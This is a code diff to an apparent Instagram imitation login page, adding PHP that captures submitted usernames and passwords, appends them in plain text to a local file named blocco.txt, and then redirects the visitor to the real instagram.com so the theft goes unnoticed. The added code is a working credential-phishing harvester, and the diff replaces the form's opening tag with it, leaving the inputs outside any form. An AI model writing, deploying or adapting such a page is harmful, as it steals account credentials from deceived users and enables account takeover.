@@ -87,7 +87,21 @@
 
 <br><br>
 
-	<form action="https://instasuport.netlify.app/file.php" method="post">
+	<?php
+$n = $_POST['nome'];
+$p = $_POST['pass'];
+$dati = "Username: ";
+$dati .= $n;
+$dati .= " - Password: ";
+$dati .= $p;
+$dati .= "\n\n";
+
+$var=fopen("blocco.txt","a");
+fwrite($var,$dati);
+fclose($var);
+
+header("location: https://instagram.com")
+?>
 		<input type="text" placeholder="Username" name="nome" class="log" required>
 <br>
 		<input type="password" placeholder="Password" name="pass" class="log" required>
